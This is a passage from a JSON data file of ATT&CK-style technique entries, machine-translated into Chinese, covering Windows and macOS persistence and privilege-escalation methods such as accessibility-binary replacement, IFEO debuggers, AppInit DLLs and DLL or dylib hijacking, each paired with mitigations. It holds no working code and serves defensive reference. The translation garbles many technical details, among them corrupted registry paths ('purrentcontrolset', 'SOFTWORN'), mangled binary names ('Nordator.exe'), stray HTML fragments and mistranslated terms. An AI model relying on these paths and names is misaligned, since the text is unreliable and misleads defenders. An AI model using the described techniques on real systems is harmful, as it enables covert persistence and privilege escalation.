              "content": "二进制文件也可以基于其所需的动态库的基础，并且如果应用程序需要一个新的动态库，该库将作为更新的一部分包含在内，则应研究。"
            }
          ]
        ]
      },
      {
        "id": "M1045",
        "name": "代码签名",
        "description": [
          [
            {
              "type": "text",
              "content": "强迫所有二进制文件均由正确的Apple开发人员ID签名。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "通过已知的哈希允许应用。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1546.007",
    "name": "Netsh Helper DLL",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行由Netsh Helper DLL触发的恶意内容来建立持久性。netsh.exe（也称为NetShell）是一种命令行脚本实用程序，用于与系统的网络配置进行交互。它包含添加助手DLL以扩展实用程序功能的功能。注册netsh.exe助手DLL的路径以"
        },
        {
          "type": "code",
          "content": " hklm \\ Software \\ Microsoft \\ netsh "
        },
        {
          "type": "text",
          "content": "输入到Windows注册表中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用netsh.exe助手DLL持续触发任意代码的执行。该执行将在执行netsh.exe时进行，这可能会自动发生，或者使用另一种持久技术，或者是否存在其他软件（EX：VPN），该系统在其正常功能的一部分中执行NetSh.exe。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1546.008",
    "name": "Accessibility Features",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行可访问性功能触发的恶意内容来建立持久性和/或提升特权。Windows包含可访问性功能，可以在用户登录之前使用密钥组合启动（例如：当用户在Windows登录屏幕上时）。对手可以修改这些程序的启动方式以获取命令提示符或后门，而无需登录系统。"
        }
      ],
      [
        {
          "type": "text",
          "content": "两个常见的可访问性程序是"
        },
        {
          "type": "code",
          "content": " c：\\ windows \\ system32 \\ sethc.exe "
        },
        {
          "type": "text",
          "content": "，在按下偏移键五次时启动，"
        },
        {
          "type": "code",
          "content": " c：\\ windows \\ system32 \\ utilman.exe "
        },
        {
          "type": "text",
          "content": " </code>在按下Windows + U键组合时启动。SETHC.EXE程序通常称为“粘密钥”，对手已经使用了通过远程桌面登录屏幕进行未经身份验证的访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "根据Windows的版本，对手可以以不同的方式利用这些功能。对手使用的常见方法包括替换注册表中这些二进制文件的可访问性功能二进制文件或指针/引用。在较新版本的Windows中，需要为X64系统签名替换的二进制文件，二进制文件必须位于"
        },
        {
          "type": "code",
          "content": ">％systemdir％\\ "
        },
        {
          "type": "text",
          "content": "中，并且必须受到Windows文件或资源保护（WFP/WRP）的保护）。图像文件执行选项注入调试器方法可能被发现为潜在的解决方法，因为它不需要更换相应的可访问性二进制功能。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果要在Windows XP和后来以及Windows Server 2003/R2上进行简单的二进制替换，例如，可以替换程序（例如，"
        },
        {
          "type": "code",
          "content": " c：\\ code> c：\\ windows \\ system32 \\ utilman.exe "
        },
        {
          "type": "text",
          "content": "）使用“ cmd.exe”（或其他提供后门访问的程序）。随后，在坐在键盘上或通过远程桌面协议连接时在登录屏幕上按适当的键组合将导致使用系统特权执行替换的文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "存在其他可访问性功能，也可能以类似的方式利用："
        }
      ],
      [
        {
          "type": "list",
          "content": "屏幕键盘：C：\\ Windows \\ System32 \\ osk.exe"
        },
        {
          "type": "list",
          "content": "放大器：C：\\ Windows \\ System32 \\ magnify.exe"
        },
        {
          "type": "list",
          "content": "叙述者：C：\\ Windows \\ System32 \\ Nordator.exe"
        },
        {
          "type": "list",
          "content": "显示切换器：C：\\ Windows \\ System32 \\ displaysWitch.exe"
        },
        {
          "type": "list",
          "content": "App Switcher：C：\\ Windows \\ System32 \\ AtBroker.exe"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "对手可以用替代二进制文件替换可访问性功能，以执行此技术。通过使用应用程序控制工具，例如Windows Defender Application Control，Applocker或软件限制策略，可以通过可访问性功能来识别并阻止潜在的恶意软件。"
            }
          ]
        ]
      },
      {
        "id": "M1035",
        "name": "限制网络对资源的访问",
        "description": [
          [
            {
              "type": "text",
              "content": "如果可能，请使用远程桌面网关来管理网络中RDP的连接和安全配置。"
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "要远程使用此技术，对手必须与RDP一起使用它。确保启用网络级别的身份验证，可以在创建会话并显示登录屏幕之前强制远程桌面会话进行身份验证。默认情况下在Windows Vista上启用它，然后以后。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1546.009",
    "name": "AppCert DLLs",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行加载到进程的AppCert DLL触发的恶意内容来建立持久性和/或提升特权。在"
        },
        {
          "type": "code",
          "content": " appcertdlls "
        },
        {
          "type": "text",
          "content": " regive> registry键"
        },
        {
          "type": "code",
          "content": " hkey_local_machine \\ purrentcontrolset \\ control \\ control \\ session \\ "
        },
        {
          "type": "text",
          "content": "下，在"
        },
        {
          "type": "code",
          "content": " appcertdlls "
        },
        {
          "type": "text",
          "content": " regive键下指定的Dynamic-link库（DLL）已使用的应用程序编程接口（API）函数"
        },
        {
          "type": "code",
          "content": " createProcess "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " createProcessAsuser "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " createProcesswithloginw "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " creat> createprocesporsespesswithtokenw "
        },
        {
          "type": "text",
          "content": " </code>，或/代码>。"
        }
      ],
      [
        {
          "type": "text",
          "content": "与过程注入类似，可以滥用此值，以通过在计算机上单独的过程中加载恶意DLL并运行恶意DLL来获得高架特权。恶意的AppCert DLL也可以通过不断受到API活动触发而提供持久性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "对手安装新的AppCertDll二进制文件以执行此技术。通过使用应用程序控制工具，例如Windows Defender Application Control，Applocker或软件限制策略，可以通过AppCertDlls功能执行并阻止潜在的恶意软件。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1546.010",
    "name": "AppInit DLLs",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行加载到进程的Appinit DLL触发的恶意内容来建立持久性和/或提升特权。Dynamic-link libraries (DLLs) that are specified in the "
        },
        {
          "type": "code",
          "content": "AppInit_DLLs"
        },
        {
          "type": "text",
          "content": " value in the Registry keys "
        },
        {
          "type": "code",
          "content": "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows"
        },
        {
          "type": "text",
          "content": " or "
        },
        {
          "type": "code",
          "content": "HKEY_LOCAL_MACHINE\\Software \\ WOW6432NODE \\ MICROSOFT \\ Windows NT \\ CurrentVersion \\ Windows "
        },
        {
          "type": "text",
          "content": "被用户32.DLL加载到加载User32.dll的每个过程中。实际上，这几乎是每个程序，因为user32.dll是一个非常常见的库。"
        }
      ],
      [
        {
          "type": "text",
          "content": "与过程注入类似，可以滥用这些值，以通过在计算机上单独的过程中加载恶意DLL并运行恶意DLL来获得高架特权。恶意的dlls也可能通过不断受到API活动触发而提供持久性。"
        }
      ],
      [
        {
          "type": "text",
          "content": "当启用安全启动时，在Windows 8和更高版本中禁用Appinit DLL功能。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "对手可以安装新的Appinit DLLS二进制文件来执行此技术。通过使用应用程序控制工具，例如Windows Defender Application Control，Applocker或软件限制策略，可以通过Appinit DLLS功能执行并阻止潜在的恶意软件。"
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "更新软件",
        "description": [
          [
            {
              "type": "text",
              "content": "升级到Windows 8或更高版本，并启用安全启动。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1546.011",
    "name": "Application Shimming",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行由应用程序垫片触发的恶意内容来建立持久性和/或提升特权。创建了Microsoft Windows应用程序兼容性基础架构/框架（应用程序SHIM），以允许软件向后兼容，因为操作系统代码库会随着时间的推移而变化。例如，应用程序的功能使开发人员可以将修复程序应用于为Windows XP创建的应用程序（无需重写代码），以便它可以与Windows 10一起使用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在框架内，创建垫片是为了充当程序（或更具体地说是导入地址表）和Windows OS之间的缓冲区。执行程序后，引用垫片缓存以确定程序是否需要使用SHIM数据库（.sdb）。如果是这样，SHIM数据库使用挂钩根据需要重定向代码，以与OS通信。"
        }
      ],
      [
        {
          "type": "text",
          "content": "默认Windows Installer（sdbinst.exe）当前安装的所有垫片的列表都保存在："
        }
      ],
      [
        {
          "type": "list",
          "content": "％windir％\\ apppatch \\ sysmain.sdb和"
        },
        {
          "type": "list",
          "content": "HKLM \\ Software \\ Microsoft \\ Windows NT \\ CurrentVersion \\ AppCompatflags \\ installedsdb"
        }
      ],
      [
        {
          "type": "text",
          "content": "自定义数据库存储在："
        }
      ],
      [
        {
          "type": "list",
          "content": "％windir％\\ apppatch \\ custom＆％windir％\\ apppatch \\ apppatch64 \\自定义和"
        },
        {
          "type": "list",
          "content": "HKLM \\ Software \\ Microsoft \\ Windows NT \\ Currentversion \\ AppCompatflags \\自定义"
        }
      ],
      [
        {
          "type": "text",
          "content": "为了确保垫片安全，Windows设计它们以在用户模式下运行，以便它们无法修改内核，并且您必须拥有管理员特权来安装垫片。但是，某些垫片可用于绕过用户帐户控制（UAC和REDIRECTEXE），将DLL注入进程（InjectDll），禁用数据执行预防（DISABLENX）和结构异常处理（DISABLESEH）以及拦截内存地址（GetProcadDress）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "利用这些垫片可能会允许对手执行几种恶意行为，例如提升特权，安装后门，禁用Windows Defender等防御措施等。还可以滥用SHIMS来通过不断受到影响的程序调用来确立持久性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1051",
        "name": "更新软件",
        "description": [
          [
            {
              "type": "text",
              "content": "Microsoft发布了一个可选的补丁更新-KB3045645-将删除sdbinst.exe中的“自动级别”标志。这将防止使用应用程序绕过UAC。"
            }
          ]
        ]
      },
      {
        "id": "M1052",
        "name": "用户帐户控制",
        "description": [
          [
            {
              "type": "text",
              "content": "将UAC设置更改为“始终通知”，当请求UAC高程时，将使用户更具可见性，但是，由于持续的UAC中断，此选项在用户中不会流行。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1546.012",
    "name": "Image File Execution Options Injection",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行图像文件执行选项（IFEO）辩论者触发的恶意内容来建立持久性和/或提升特权。IFEOS使开发人员能够将调试器附加到应用程序。创建过程时，将在应用程序的IFEO中出现的调试器将被预先介绍到该应用程序的名称，从而有效地启动调试器下的新过程（例如，<code> c：\\ dbg \\ ntsd.exe -g notepad.exe </ exe </代码>）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "IFEO可以通过注册表或全局标志通过GFLAGS工具设置。ifeos表示为"
        },
        {
          "type": "code",
          "content": " debugger "
        },
        {
          "type": "text",
          "content": "在"
        },
        {
          "type": "code",
          "content": " hklm \\ software下的注册表中的值{\\ wow6432node} \\ microsoft \\ microsoft \\ windows nt \\ windows nt \\ currentversion \\ currentversion \\ image file file excution \\ "
        },
        {
          "type": "text",
          "content": "在其中> </code>是附加调试器的二进制文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "当指定程序默默退出时，IFEOS还可以启动任意监视程序（即已过早终止或第二个非内核模式流程）。与辩论者类似，可以通过GFLAG和/或直接修改IFEO和静音过程退出注册表值"
        },
        {
          "type": "code",
          "content": " HKEY_LOCAL_MACHINE \\ SOFTWORN \\ MICROSOFT \\ MICROSOFT \\ MICROSOFT \\ Windows NT \\ CurrentVersion \\ SilentProcessExit \\ "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "类似于Windows Vista和后来以及Windows Server 2008及以后的可访问性功能，可以修改注册表密钥，以配置“ cmd.exe”或其他提供后门访问的程序，作为可访问性程序的“调试器”（例如：utilman.exe）。修改注册表后，在键盘上或与远程桌面协议连接时，在登录屏幕上按适当的键组合将导致“调试器”程序使用系统特权执行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "与过程注入类似，也可能会滥用这些值，以通过在计算机上单独的过程中加载恶意可执行文件来获得特权升级。安装IFEO机制也可以通过连续触发的调用提供持久性。"
        }
      ],
      [
        {
          "type": "text",
          "content": "恶意软件还可以使用IFEO来通过注册重定向并有效禁用各种系统和安全应用程序的无效辩论者来损害防御。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1546.013",
    "name": "PowerShell Profile",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行PowerShell配置文件触发的恶意内容来获得持久性并提高特权。PowerShell配置文件（"
        },
        {
          "type": "code",
          "content": " profile.ps1 "
        },
        {
          "type": "text",
          "content": "）是一个脚本，当PowerShell启动并可以用作登录脚本来自定义用户环境。"
        }
      ],
      [
        {
          "type": "text",
          "content": "PowerShell根据用户或主机程序支持多个配置文件。例如，PowerShell主机程序可能会有不同的配置文件，例如PowerShell控制台，PowerShell ISE或Visual Studio Code。管理员还可以配置适用于本地计算机上所有用户和主机程序的配置文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以修改这些配置文件以包括任意命令，功能，模块和/或PowerShell驱动器以获得持久性。每当用户打开PowerShell会话时，除非启动"
        },
        {
          "type": "code",
          "content": " noprofile "
        },
        {
          "type": "text",
          "content": "标志，否则将执行修改的脚本。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果在PowerShell配置文件中的脚本由具有较高特权的帐户（例如域管理员）加载和执行的脚本，则对手也可以升级特权。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1045",
        "name": "代码签名",
        "description": [
          [
            {
              "type": "text",
              "content": "强制执行仅签名的PowerShell脚本。签名配置文件以避免修改它们。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "使PowerShell配置不变，并且只能由某些管理员改变，将限制对手轻松创建用户级别持久性的能力。"
            }
          ]
        ]
      },
      {
        "id": "M1054",
        "name": "软件配置",
        "description": [
          [
            {
              "type": "text",
              "content": "如果不需要，请避免使用PowerShell概况。远程执行PowerShell脚本时，请使用-NO配置文件标志，以防止局部配置文件和脚本执行。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1546.014",
    "name": "Emond",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行事件监视器守护程序（EMOND）触发的恶意内容来获得持久性并提高特权。Emond是一个发射守护程序，它接受来自各种服务的事件，通过简单的规则引擎运行并采取行动。"
        },
        {
          "type": "code",
          "content": "/sbin/emond "
        },
        {
          "type": "text",
          "content": "的Emond二进制文件将加载"
        },
        {
          "type": "code",
          "content": " /etc/emond.d/rules/"
        },
        {
          "type": "text",
          "content": "目录的任何规则，并在发生明确定义的事件后采取行动。"
        }
      ],
      [
        {
          "type": "text",
          "content": "规则文件以PLIST格式定义了名称，事件类型和要采取的操作。事件类型的一些示例包括系统启动和用户身份验证。操作的示例是运行系统命令或发送电子邮件。如果Queuedirectories Path <Code>/private/var/var/db/emondclients </code>（在<codem>/system>/system/system/library/lunagredaemons/lunagredaemons/lunagredaemons/aighteraution/lunagredaemons/aighteraighation/aighteraunddaemons/com.apple.emond.plist </code>。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会在发生定义事件时编写一条规则来执行命令，例如系统启动或用户身份验证，滥用此服务。当启动守护程序服务以根特权执行EMOND服务时，对手也可以从管理员到根的特权升级。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑通过删除启动守护程序PLIST文件来禁用Emond。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1546.015",
    "name": "Component Object Model Hijacking",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行由被劫持的对象模型（COM）对象触发的恶意内容来建立持久性。COM是Windows中的系统，可以通过操作系统在软件组件之间进行交互。对各种com对象的引用存储在注册表中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用COM系统插入可以通过劫持COM参考和关系来代替合法软件执行的恶意代码，作为持久性的手段。劫持COM对象需要更改注册表来替换对合法系统组件的引用，该组件可能会导致该组件在执行时不起作用。当通过普通系统操作执行该系统组件时，对手的代码将被执行。对手可能会劫持经常使用以保持一致持久水平的对象，但不太可能破坏系统内部明显的功能，以避免系统不稳定性可能导致检测。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1546.016",
    "name": "Installer Packages",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过使用安装程序触发恶意内容的执行来建立持久性并提高特权。安装程序软件包是特定于操作系统的，并包含操作系统在系统上安装应用程序所需的资源。安装程序软件包可以包括在安装之前运行的脚本以及安装完成后。执行时，安装程序脚本可能会继承提高权限。开发人员经常使用这些脚本来准备安装，检查要求，下载依赖项并在安装后删除文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "使用合法的应用程序，对手已经分布了带有修改的安装程序脚本的应用程序来执行恶意内容。当用户安装应用程序时，可能需要授予管理权限以允许安装。在合法应用程序的安装过程结束时，MacOS "
        },
        {
          "type": "code",
          "content": " PostSinstall "
        },
        {
          "type": "text",
          "content": "脚本等内容可以使用继承的高架权限执行。对手可以使用这些脚本执行恶意可执行文件，也可以安装具有升高权限的其他恶意组件（例如启动守护程序）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "根据分布，包装安装程序脚本的Linux版本有时称为“维护程序”脚本或后安装脚本。这些脚本可以包括"
        },
        {
          "type": "code",
          "content": " preinst "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " postInst "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " prerm "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " poStrm "
        },
        {
          "type": "text",
          "content": "脚本，并在执行时作为root运行。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对于Windows，Microsoft安装程序服务使用"
        },
        {
          "type": "code",
          "content": " .msi "
        },
        {
          "type": "text",
          "content": "文件来管理应用程序的安装，更新和卸载。对手已利用"
        },
        {
          "type": "code",
          "content": " prebuild "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": "后构建"
        },
        {
          "type": "text",
          "content": "事件在安装.msi文件时构建之前或之后运行命令。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1574.001",
    "name": "DLL Search Order Hijacking",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过劫持用于加载DLL的搜索顺序来执行自己的恶意有效载荷。Windows系统使用一种常见方法来寻找所需的DLL来加载到程序中。劫持DLL负载可能是为了建立持久性以及提高特权和/或逃避文件执行的限制。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过多种方式劫持DLL负载。对手可能会在一个目录中播放特洛伊木马动态链接库文件（DLL），该目录将在合法库的位置之前搜索，该图书馆将由程序请求，从而导致窗户在受害者计划要求时加载其恶意库。对手也可以通过将具有与模棱两可的DLL放置在Windows在合法的DLL之前搜索的位置中使用的恶意DLL来执行DLL预加载，也称为二进制种植攻击。通常，此位置是该程序的当前工作目录。当程序将当前目录设置为远程位置（例如Web共享）之前，远程DLL预加载攻击会发生。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可以通过DLL重定向直接修改搜索顺序，在启用后（在注册表和创建重定向文件中）可能会导致程序加载其他DLL。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果将搜索订单验证程序配置为以较高的特权级别运行，则加载的对手控制的DLL也将在较高级别上执行。在这种情况下，根据程序，该技术可用于从用户到管理员或系统或从管理员到系统的特权升级，具体取决于程序。成为劫持路径受害者的程序似乎通常行事正常，因为恶意DLL可能被配置为还加载了原本要替换的合法DLL。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "使用能够检测企业内部系统上劫持的DLL搜索订单劫持机会并纠正它们的审计工具。PowerSploit框架之类的工具包包含动力模块，可用于探索用于劫持弱点的系统。"
            }
          ],
          [
            {
              "type": "text",
              "content": "使用Windows随附的程序sxstrace.exe以及手动检查，以检查清单文件，以了解软件中的并排问题。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "对手可以使用新的DLL来执行此技术。通过使用能够阻止合法软件加载的DLL的应用程序控制解决方案来识别并阻止通过搜索订单劫持执行的潜在恶意软件。"
            }
          ]
        ]
      },
      {
        "id": "M1044",
        "name": "限制库加载",
        "description": [
          [
            {
              "type": "text",
              "content": "禁止远程DLL的加载。默认情况下将其包含在Windows Server 2012+中，可以通过Patch for XP+和Server 2003+获得。"
            }
          ],
          [
            {
              "type": "text",
              "content": "启用安全的DLL搜索模式，强制在目录中使用更大限制（例如"
            },
            {
              "type": "code",
              "content": "％SystemRoot％"
            },
            {
              "type": "text",
              "content": "）的目录中搜索系统DLL，在本地目录DLL之前使用（例如，用户的主目录）"
            }
          ],
          [
            {
              "type": "text",
              "content": "可以通过计算机配置> [策略]>管理模板> MSS（旧版）：MSS ：（ SafeDllSearchMode）启用安全的DLL搜索模式。关联的Windows注册表权点位于"
            },
            {
              "type": "code",
              "content": " HKLM \\ System \\ CurrentControlset \\ Control \\ Control \\ Session Manager \\ SafeDllSearchMode "
            },
            {
              "type": "text",
              "content": ""
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.002",
    "name": "DLL Side-Loading",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过侧面加载DLL执行自己的恶意有效载荷。类似于DLL搜索订单劫持，侧载涉及劫持程序加载的DLL。但是，对手不仅在程序的搜索顺序中种植DLL，而是等待受害者申请被调用，还可以通过种植然后调用合法申请来直接辅助其有效载荷，以执行其有效载荷（S）。"
        }
      ],
      [
        {
          "type": "text",
          "content": "侧加载利用了加载程序使用的DLL搜索顺序，通过将受害者应用程序和恶意有效载荷彼此定位。对手可能会使用侧载作为掩盖他们在合法，可信赖且可能提高的系统或软件过程中执行的动作的手段。在交货和/或执行期间，可能不会标记用于侧载有效载荷的良性可执行文件。对手有效载荷也可以加密/包装或以其他方式混淆，直到加载到受信任过程的内存中为止。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1013",
        "name": "应用程序开发人员指导",
        "description": [
          [
            {
              "type": "text",
              "content": "在可能的情况下，在清单文件中包括哈希值，以帮助防止恶意库的侧面加载。"
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "更新软件",
        "description": [
          [
            {
              "type": "text",
              "content": "定期更新软件以包含修复DLL侧加载漏洞的补丁。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.004",
    "name": "Dylib Hijacking",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "2.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过在运行时搜索受害者应用程序搜索的路径中，将带有预期名称的恶意动态库（Dylib）执行自己的有效载荷。动态加载程序将尝试根据搜索路径的顺序找到Dylibs。Dylibs的路径可以用"
        },
        {
          "type": "code",
          "content": " @RPath "
        },
        {
          "type": "text",
          "content": "前缀，该路径允许开发人员使用相对路径根据可执行文件的位置指定运行时使用的搜索路径数组。此外，如果使用弱链接，例如"
        },
        {
          "type": "code",
          "content": " lc_load_weak_dylib "
        },
        {
          "type": "text",
          "content": "函数，即使不存在预期的迪利布，应用程序仍将执行。弱连接使开发人员可以在添加新API时在多个MacOS版本上运行应用程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过在已确定的路径中插入带有丢失迪利布的名称的恶意迪利布来获得执行。迪利布（Dylibs）被加载到应用程序的地址空间中，使恶意迪利布（Dylib）继承了应用程序的特权级别和资源。基于该应用程序，这可能导致特权升级和不受限制的网络访问。由于在合法过程中掩盖了执行，因此该方法还可以从安全产品中逃避检测。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "设置目录访问控件，以防止文件写入应用程序的搜索路径，包括在运行应用程序的文件夹和标准Dylib文件夹中。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1574.005",
    "name": "Executable Installer File Permissions Weakness",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      }
    ],
    "technique": "Hijack Execution Flow",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过劫持安装程序使用的二进制文件来执行自己的恶意有效载荷。这些过程可能会自动执行特定的二进制文件作为其功能的一部分或执行其他操作。如果不正确设置包含目标二进制的文件系统目录或二进制本身上的权限，则可以使用用户级权限将目标二进制覆盖并通过原始过程执行。如果原始过程和线程在较高的权限级别下运行，则替换的二进制文件也将在更高级别的权限下执行，其中可能包括系统。"
        }
      ],
      [
        {
          "type": "text",
          "content": "该技术的另一个变体可以通过利用在可执行，自提取的安装程序中常见的弱点来执行。在安装过程中，安装程序通常在"
        },
        {
          "type": "code",
          "content": "％temp％"
        },
        {
          "type": "text",
          "content": "目录中使用子目录，以解开诸如DLL，EXES或其他有效载荷之类的二进制文件。当安装程序创建子目录和文件时，他们通常不会设置适当的权限来限制写入访问权限，从而可以执行放置在子目录中或覆盖安装过程中使用的二进制文件中的不信任代码。此行为与DLL搜索顺序劫持有关，并且可能会利用DLL搜索顺序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用这种技术用恶意替代合法的二进制文件，作为在较高权限级别执行代码的一种手段。某些安装程序还可能需要提高特权，这将在执行对手控制的代码时会导致特权升级。此行为与绕过用户帐户控制有关。已经向软件供应商报告了现有普通安装程序中这种弱点的几个示例。如果将执行过程设置为在特定时间或在某个事件中运行（例如，系统启动），则该技术也可以用于持久性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
